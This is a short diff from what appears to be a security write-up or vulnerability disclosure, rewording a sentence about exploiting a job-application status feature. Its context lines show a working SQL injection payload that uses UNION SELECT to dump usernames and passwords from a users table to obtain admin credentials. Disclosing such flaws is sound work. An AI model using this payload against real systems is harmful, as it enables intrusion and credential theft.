@@ -83,7 +83,7 @@ Using union based injection techniques we have enumerated a table name of "users
 `
 test' UNION SELECT 1, 2, 3, group_concat(username, ':', password) FROM users  -- 
 `
-This was the payload used to exploit this candidate application status feature to obtain admin credentials
+This payload allowed for exploitation of the candidate application status feature to obtain admin credentials
 
 <img width="1313" height="307" alt="image" src="https://github.com/user-attachments/assets/15424dff-f4a6-4d67-83a1-20223ebe1303" />
 
